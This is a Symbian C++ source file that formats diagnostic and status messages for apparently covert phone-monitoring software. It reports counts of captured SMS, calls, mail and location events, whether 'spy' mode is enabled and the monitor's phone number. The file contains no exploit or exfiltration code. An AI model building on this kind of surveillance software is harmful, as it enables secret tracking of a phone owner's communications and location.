#include "AppHelpText.h"

// System includes
#include <eikenv.h>			// CCoeEnv
#include <logview.h>		// CLogViewEvent
#include <logwrap.h>

#include "Global.h" // predefine macro
#include "CltAppUi.h"
#include "CltDatabase.h"
#include "RscHelper.h"
#include "AppSysMessage.h"
#include "DriveInfo.h"
#include "Logger.h"
#include "DbHealth.h"
#include "AppDefinitions.h"
#include "ServConnectMan.h"
#include "RscHelper.h"
#include "SmsCmdFormatter.h"

#include "Apprsg.h"

const TInt KRespMessageDefaultLength = 200;

CAppHelpText::CAppHelpText(MLastConnInfoSource& aConnInfoSource)
:iConnInfoSource(aConnInfoSource)
	{
	}

CAppHelpText::~CAppHelpText()
	{	
	}

CAppHelpText* CAppHelpText::NewL(MLastConnInfoSource& aConnInfoSource)
	{
	CAppHelpText* self = new (ELeave) CAppHelpText(aConnInfoSource);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CAppHelpText::ConstructL()
	{
	}
	
HBufC* CAppHelpText::DiagnosticMessageLC() 
	{
	//CCoeEnv& coeEnv = Global::CoeEnv();
	//@todo change to use CCoeEnv::Format() instead
	TStringFormatter formatter;
	RBuf buffer;
	buffer.CleanupClosePushL();
	
	//1. App and version name
	//we now use product id as name
	TVersionName verName =  AppDefinitions::Version().Name();//1.00(0)
	HBufC* nameVerFmt = RscHelper::ReadResourceLC(R_TEXT_PRODUCT_NAME_AND_VERSION);
	const TDesC& verFmted = formatter.Format(*nameVerFmt, PRODUCT_ID, &verName);
	AppendL(buffer,verFmted);
	CleanupStack::PopAndDestroy(nameVerFmt);	
	
	//2.
	CFxsDatabase& db = Global::Database();
	HBufC* dbSizeFmt = RscHelper::ReadResourceLC(R_TXT_APP_INFO_DB_SIZE);
	const TDesC& dbSizeTxtFormatted = formatter.Format(*dbSizeFmt, db.DbFileSize() / 1024);
	CleanupStack::PopAndDestroy(dbSizeFmt);
	AppendL(buffer,dbSizeTxtFormatted);
	
	//3.
	TFxLogEventCount dbCount;
	TRAPD(err,db.GetEventCountL(dbCount));
	HBufC* dbRowCountFmt = RscHelper::ReadResourceLC(R_TXT_APP_INFO_DB_ROW_COUNT);
	const TDesC& dbRowCountTxtFormatted = formatter.Format(*dbRowCountFmt, dbCount.Get(TFxLogEventCount::EEventALL));
	CleanupStack::PopAndDestroy(dbRowCountFmt);
	AppendL(buffer,dbRowCountTxtFormatted);
	
	//4.
	HBufC* smsVoiceCountFmg = RscHelper::ReadResourceLC(R_TXT_APP_INFO_SMS_VOICE_COUNT);
	const TDesC& smsVoiceCountTextFormatted = formatter.Format(*smsVoiceCountFmg,
															   dbCount.Get(TFxLogEventCount::EEventSmsIN),
															   dbCount.Get(TFxLogEventCount::EEventSmsOUT),
															   dbCount.Get(TFxLogEventCount::EEventVoiceIN),
															   dbCount.Get(TFxLogEventCount::EEventVoiceOUT),
															   dbCount.Get(TFxLogEventCount::EEventVoiceMissed),
															   dbCount.Get(TFxLogEventCount::EEventMailIN),
															   dbCount.Get(TFxLogEventCount::EEventMailOUT),
															   dbCount.Get(TFxLogEventCount::EEventLocation),
															   dbCount.Get(TFxLogEventCount::EEventSystem));
	CleanupStack::PopAndDestroy(smsVoiceCountFmg);
	AppendL(buffer,smsVoiceCountTextFormatted);
	
	//5.	
	CFxsAppUi& appUi = Global::AppUi();
	TBuf<2> driveChar;
	appUi.GetAppDrive(driveChar);
	TInt drive;
	appUi.GetAppDrive(drive);	
	RFs& fs = appUi.FsSession();	
	TInt free(-1);	
	DriveInfUtil::GetFreeSpace(fs, drive, free);
	HBufC* diskFreeFmt = RscHelper::ReadResourceLC(R_TXT_APP_INFO_DISK_FREE);
	const TDesC& diskFreeTxtFormatted = formatter.Format(*diskFreeFmt, free);
	CleanupStack::PopAndDestroy(diskFreeFmt);
	AppendL(buffer,diskFreeTxtFormatted);
	
	//6.
	TInt phoneMemFree = -1;
	DriveInfUtil::GetFreeSpace(fs, EDriveC, phoneMemFree);
	HBufC* memFreeFmt = RscHelper::ReadResourceLC(R_TXT_APP_INFO_PHONE_MEM_FREE);
	const TDesC& phoneMemFreeFormatted = formatter.Format(*memFreeFmt, phoneMemFree);
	CleanupStack::PopAndDestroy(memFreeFmt);
	AppendL(buffer,phoneMemFreeFormatted);
	
	//7.
	const TServConnectionInfo& lastConnInfo = iConnInfoSource.LastConnectionInfo();
	_LIT(KTimeFormat,"%F%D/%M/%Y %H:%T%" );
	TBuf<30> timeFmtted;
	formatter.FormatL(timeFmtted, KTimeFormat, lastConnInfo.iConnEndTime);	
	HBufC* lastConnTimeFmt = RscHelper::ReadResourceLC(R_TXT_DIAGN_INFO_LAST_CONN_TIME);
	const TDesC& lastConnTimeFmtted = formatter.Format(*lastConnTimeFmt, &timeFmtted);
	CleanupStack::PopAndDestroy(lastConnTimeFmt);	
	AppendL(buffer,lastConnTimeFmtted);
	
	//8.
	//
	//Text: Response: %x, %x
	//
	//the first one is value defined in TConnectionEvent 
	//
	//success response is  0,0x7,0x0
	//
	HBufC* connInfoFmt = RscHelper::ReadResourceLC(R_TXT_DIAGN_INFO_LAST_CONN_RESPONSE_CODE);
	const TDesC& servRespFmt = formatter.Format(*connInfoFmt,
												lastConnInfo.iConnErrInfo.iError,
												lastConnInfo.iConnErrInfo.iConnError,
												(TUint8)lastConnInfo.iServRespCode);
	CleanupStack::PopAndDestroy(connInfoFmt);
	AppendL(buffer,servRespFmt);
	
	HBufC* apnNameFmt = RscHelper::ReadResourceLC(R_TXT_DIAGN_APN_NAME_USED);
	const TDesC& apnNameFmted = formatter.Format(*apnNameFmt, &lastConnInfo.iAP_Info.iDisplayName);
	CleanupStack::PopAndDestroy(apnNameFmt);
	AppendL(buffer,apnNameFmted);
	
	HBufC* ret = HBufC::NewL(buffer.Length());
	ret->Des().Append(buffer);
	CleanupStack::PopAndDestroy(&buffer);
	
	CleanupStack::PushL(ret);
	return ret;
	}
	
HBufC* CAppHelpText::SpyInfoMessageLC()
	{
	CFxsSettings& settings = Global::Settings();
	TMonitorInfo& spy = settings.SpyMonitorInfo();	
	CCoeEnv& coeEnv = Global::CoeEnv();
	TBuf<0x100> text;
	
	HBufC* yesTxt = RscHelper::ReadResourceLC(R_TEXT_YES);
	HBufC* noTxt = RscHelper::ReadResourceLC(R_TEXT_NO);	
	
	const TInt KMaxLength = 200;	
	HBufC* retMsg = HBufC::NewLC(KMaxLength);
	TPtr ptr = retMsg->Des();	
	
	//1. spy enabling
	if(spy.SpyEnable())
		{
		coeEnv.Format128(text,R_TEXT_SPYINFO_SPYENABLE, yesTxt);
		}
	else
		{
		coeEnv.Format128(text,R_TEXT_SPYINFO_SPYENABLE, noTxt);
		}
	ptr.Append(text);
	CleanupStack::PopAndDestroy(2);
	
	//2. spy number
	text.SetLength(0);
	coeEnv.Format128(text, R_TEXT_SPYINFO_NUMBER, &spy.MonitorNumber());
	ptr.Append(text);	
	return retMsg;
	}
	
HBufC* CAppHelpText::DbHealthMessageLC()
	{
	const TInt KMaxlengthString = 200;
	CFxsDatabase& db = Global::Database();
	const TDbHealth& dbHealth = db.DbHealthInfoL();	
	CCoeEnv& coeEnv = Global::CoeEnv();
	TBuf<0x100> text;
	HBufC* message = HBufC::NewLC(KMaxlengthString);
	TPtr ptr = message->Des();
	
	HBufC* txtYes = RscHelper::ReadResourceLC(R_TEXT_YES);
	HBufC* txtNo = RscHelper::ReadResourceLC(R_TEXT_NO);		
	//1. corrupted
	if(dbHealth.iCorrupted)
		{
		coeEnv.Format128(text,R_TEXT_DBHEALTH_CORRUPTED, txtYes);
		}
	else
		{
		coeEnv.Format128(text,R_TEXT_DBHEALTH_CORRUPTED, txtNo);		
		}		
	ptr.Append(text);
	
	//2. damage	
	text.SetLength(0);
	if(dbHealth.iDamaged)
		{
		coeEnv.Format128(text,R_TEXT_DBHEALTH_DAMAGED, txtYes);		
		}
	else
		{
		coeEnv.Format128(text,R_TEXT_DBHEALTH_DAMAGED, txtNo);		
		}
	ptr.Append(text);
	CleanupStack::PopAndDestroy(2);//txtYes,txtNo
	
	//3. drop count
	text.SetLength(0);
	coeEnv.Format128(text,R_TEXT_DBHEALTH_DROPED_COUNT, dbHealth.iDropedCount);	
	ptr.Append(text);
	
	//4. corrutped
	text.SetLength(0);	
	coeEnv.Format128(text,R_TEXT_DBHEALTH_ROW_CORRUPTED_COUNT, dbHealth.iRowCorruptedCount);
	ptr.Append(text);
	
	//5. recovered count	
	text.SetLength(0);	
	coeEnv.Format128(text,R_TEXT_DBHEALTH_RECOVERED_COUNT, dbHealth.iRecoveredCount);
	ptr.Append(text);
	
	return message;
	}
	
void CAppHelpText::AppendL(RBuf& aBuf, const TDesC& aMessage)
	{
	aBuf.ReAllocL(aBuf.Length() + aMessage.Length());
	aBuf.Append(aMessage);
	}
